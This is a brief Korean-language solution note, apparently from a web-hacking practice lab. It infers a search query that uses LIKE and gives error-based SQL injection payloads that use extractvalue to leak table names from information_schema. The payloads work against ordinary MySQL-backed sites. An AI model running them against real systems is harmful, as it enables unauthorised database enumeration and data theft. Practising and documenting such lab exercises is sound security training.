1. 풀이과정
1. 쿼리문 유추 
select * from 게시판 where 제목 like '%__검색어__%'

eqst%' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1))) and 'k%'='k


2. 공격포인트

검색어: eqst%' AND extractvalue(1, concat(0x3a, ('EQST'))) and 'k%'='k
